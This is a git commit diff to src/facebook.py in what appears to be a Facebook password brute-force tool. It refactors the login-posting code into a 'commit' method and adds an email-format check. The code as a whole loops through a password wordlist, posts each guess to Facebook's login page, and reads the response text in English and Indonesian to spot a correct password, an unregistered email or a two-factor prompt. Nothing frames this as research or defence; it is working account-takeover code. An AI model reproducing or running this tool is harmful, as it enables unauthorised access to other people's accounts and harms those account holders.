7e3dab1c7afe09a47cdb830b2d029a39928ba1f1
Ferdiansyah <ferdif9996@gmail.com>
2021-10-20 07:40:59 +0700

    update facebook

--- src/facebook.py
+++ src/facebook.py
@@ -1,11 +1,7 @@
-import requests, sys, time, random
+import requests, sys, time, random, re
 from bs4 import BeautifulSoup
-from colorama import init
-from termcolor import colored
 from app import logtime
-# init color print
-init()
-# Facebok Class
+
 class Facebook:
     # attribute
     url = 'https://web.facebook.com/login.php'
@@ -24,25 +20,27 @@ class Facebook:
         'password': ''
     }
     # init
-    def __init__(self, Email, TypeExecute, customfile, Password = ''):
-        if type(Email) == 'str':
-            if '@gmail.com' in Email or '@yahoo.com' in Email or '@' in Email and '.' in Email:
-                if TypeExecute == 'manual':
-                    if len(Password) < 6:
-                        sys.exit()
-        self.typeExec = TypeExecute
-        self.account['email'] = Email
-        self.account['password'] = Password
+    def __init__(self, email, execute, customfile, colored, password = ''):
+        self.execute = execute
+        self.account['email'] = email
+        self.account['password'] = password
         self.customfile = customfile
-        print(logtime(), colored('Start Facebook Bruteforce', 'blue'))
+        self.colored = colored
+        print(logtime(), self.colored('Start Facebook Bruteforce', 'blue'))
         dot = 0
         onwhile = True
         while onwhile:
             dot += 5
-            print(logtime(), colored(' ' * dot, 'blue', 'on_white') + f' {dot}%', end = "\r")
-            time.sleep(0.2)
+            print(logtime(), self.colored(' ' * dot, 'blue', 'on_white') + f' {dot}%', end = "\r")
+            time.sleep(0.1)
             if(dot == 100): onwhile = False
         print('')
+        print(logtime(), 'Checking Email...')
+        if re.search('^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$', email) is None:
+            print(logtime(), colored('Email Not Valid. Check The Email, must be email@servermail.abc', 'red'))
+            sys.exit()
+        else:
+            print(logtime(), colored('Email Is Valid', 'green'))
         self.run()
 
     def CreateForm(self):
@@ -64,36 +62,37 @@ class Facebook:
         else:
             sys.exit()
 
+    def commit(self, email, password):
+        self.payload['email']   = email
+        self.payload['pass']    = password
+        ReqPost = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
+        # print(ReqPost.text)
+        if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in ReqPost.text or 'Recent activity might affect the security of your account' in ReqPost.text or 'Harap Konfirmasikan Identitas Anda' in ReqPost.text:
+            print(self.colored(f'Password is {password}', 'blue'), end="\r")
+            sys.exit()
+            return True
+        if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in ReqPost.text or "The email address that you've entered doesn't match any account. Sign up for an account." in ReqPost.text:
+            print( "Email Not Registry.", end="\r")
+            sys.exit()
+            return True
+        if 'Ada masalah pada permintaan ini. Kami berusaha untuk menyelesaikannya dengan segera.' in ReqPost.text:
+            print(self.colored("Account Can't Be Process In Backend.", 'red'), end="\r")
+            return False
+        if  "You've entered an old password" in ReqPost.text:
+            print( " Old Password.")
+        if "Kami akan memandu Anda melalui beberapa langkah untuk membuka kunci akun Anda." in ReqPost.text:
+            print(self.colored("Password Correct But Have Two Verification", 'blue'), end="\r")
+        if "We won’t support this browser soon. For a better experience, we recommend using another browser." in ReqPost.text:
+            print(self.colored("User Agent Not Support For Now. Please Try Again...", 'yellow'), end="\r")
+            sys.exit()
+        else:
+            print(self.colored("Could Not Resolve", 'red'), end="\r")
+            return False
+
     def run(self):
         self.CreateForm()
-        def postdata(email, password):
-            self.payload['email']   = email
-            self.payload['pass']    = password
-            ReqPost = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
-            # print(ReqPost.text)
-            if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in ReqPost.text or 'Recent activity might affect the security of your account' in ReqPost.text or 'Harap Konfirmasikan Identitas Anda' in ReqPost.text:
-                print(colored(f'Password is {password}', 'blue'), end="\r")
-                sys.exit()
-                return True
-            if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in ReqPost.text or "The email address that you've entered doesn't match any account. Sign up for an account." in ReqPost.text:
-                print( "Email Not Registry.", end="\r")
-                sys.exit()
-                return True
-            if 'Ada masalah pada permintaan ini. Kami berusaha untuk menyelesaikannya dengan segera.' in ReqPost.text:
-                print(colored("Account Can't Be Process In Backend.", 'red'), end="\r")
-                return False
-            if  "You've entered an old password" in ReqPost.text:
-                print( " Old Password.")
-            if "Kami akan memandu Anda melalui beberapa langkah untuk membuka kunci akun Anda." in ReqPost.text:
-                print(colored("Password Correct But Have Two Verification", 'blue'), end="\r")
-            if "We won’t support this browser soon. For a better experience, we recommend using another browser." in ReqPost.text:
-                print(colored("User Agent Not Support For Now. Please Try Again...", 'yellow'), end="\r")
-                sys.exit()
-            else:
-                print(colored("Could Not Resolve", 'red'), end="\r")
-                return False
         # using txt file
-        if(self.typeExec == 'auto'):
+        if(self.execute == 'auto'):
             file = ''
             fileb = ''
             def success():
@@ -102,14 +101,14 @@ class Facebook:
                 for data in file:
                     i += 1
                     print(logtime(), "({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
-                    postdata(self.account['email'], data)
+                    self.commit(self.account['email'], data)
 
             if self.customfile:
                 try:
                     file = open(self.customfile, 'r')
                     fileb = open(self.customfile, 'rb')
                 except:
-                    print(logtime(), colored(f"{self.customfile} not founds. Create wordlist now", 'red'))
+                    print(logtime(), self.colored(f"{self.customfile} not founds. Create wordlist now", 'red'))
                 finally:
                     success()
 
@@ -118,16 +117,17 @@ class Facebook:
                     file = open('passwords.txt', 'r')
                     fileb = open('passwords.txt', 'rb')
                 except:
-                    print(logtime(), colored("passwords.txt not founds. Create wordlist now", 'red'))
+                    print(logtime(), self.colored("passwords.txt not founds. Create wordlist now", 'red'))
                 finally:
                     success()
+                    
         # using password
-        if(self.typeExec == 'manual'):
+        if(self.execute == 'manual'):
             email = self.account['email']
             password = self.account['password']
             if len(password) != 0 and len(password) >= 6:
                 print(logtime(), "({i})_{password}".format(i = str(0), password = password), end="-> ")
-                postdata(email, password)
+                self.commit(email, password)
             else:
                 print('Password Must Be Length More 6')
                 sys.exit()
